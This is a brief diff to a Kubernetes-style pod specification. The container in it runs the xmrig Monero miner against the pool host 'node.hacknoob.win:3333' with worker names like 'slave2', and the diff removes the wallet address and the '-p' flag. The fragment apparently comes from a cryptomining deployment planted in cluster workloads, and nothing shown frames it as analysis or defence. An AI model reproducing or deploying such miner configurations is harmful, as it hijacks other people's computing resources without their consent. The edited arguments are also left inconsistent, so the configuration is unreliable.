@@ -20,8 +20,6 @@ spec:
     - -o
     - node.hacknoob.win:3333
     - -u
-    - 46DWjxWviwCVHbYHaMxjusjGKm55LJ2G6f3YTCJDmTf2RxCLfQRx22fSRELvwq36kY6iSGD5tiUsSQ4AsE8UFnWFBDd1Lzn
-    - -p
     - slave2
     volumeMounts:
     - name: xmrig-volume-2
